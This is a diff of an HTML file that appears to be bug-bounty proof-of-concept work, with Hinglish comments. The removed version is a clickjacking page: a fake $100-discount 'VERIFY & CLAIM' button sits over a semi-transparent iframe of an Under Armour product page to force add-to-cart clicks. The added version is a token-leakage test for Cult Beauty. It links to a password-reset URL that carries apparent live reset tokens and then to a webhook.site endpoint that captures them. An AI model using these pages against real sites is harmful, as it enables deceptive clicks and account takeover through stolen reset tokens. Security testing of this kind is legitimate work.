@@ -1,34 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Impact: Forced Add-to-Cart</title>
-    <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-        #decoy { 
-            position: absolute; width: 100%; height: 100%; 
-            background: #fff; z-index: 1; text-align: center; padding-top: 150px;
-        }
-        #fake-btn { 
-            padding: 20px 60px; background: #27ae60; color: white; 
-            border: none; font-size: 22px; cursor: pointer; border-radius: 10px;
-            position: absolute;
-            /* Inko 'Add to Bag' button ke upar set karein */
-            top: 550px; 
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        iframe { 
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            z-index: 2; opacity: 0.5; border: none; 
-        }
-    </style>
+    <title>Cult Beauty Token Leakage Test</title>
 </head>
 <body>
-    <div id="decoy">
-        <h1 style="color: #27ae60;">CONGRATULATIONS!</h1>
-        <p>You've won a $100 Discount. Click below to verify your account.</p>
-        <button id="fake-btn">VERIFY & CLAIM</button>
-    </div>
-    <iframe src="https://www.underarmour.com/en-us/p/ua_tactical_coldgear_infrared_womens_base_leggings/1365395.html"></iframe>
+    <h1>Token Leakage PoC</h1>
+    <p>Is button par click karne se aap Cult Beauty ke sensitive page par jayenge.</p>
+    
+    <a href="https://www.cultbeauty.co.uk/account/reset-password?ecrmcid=Vq8bl1n6YxpmrVnNa96xrP4BWZ57Oa90&shae=NmCjaucYYsUU8C2DVQxKiKVjba%2BLmHgAus%2BbCXJHTig%3D&action=reset">
+        1. Go to Sensitive Page
+    </a>
+
+    <br><br>
+
+    <p>Ab us page par mojood kisi bhi external link (Social Media/Footer) par click karein jo niche diye gaye webhook par redirect kare.</p>
+    
+    <a href="https://webhook.site/9df24ac2-7482-487b-91fc-e34ebbdbe422">
+        2. Simulated External Link (Capture Token)
+    </a>
 </body>
 </html>
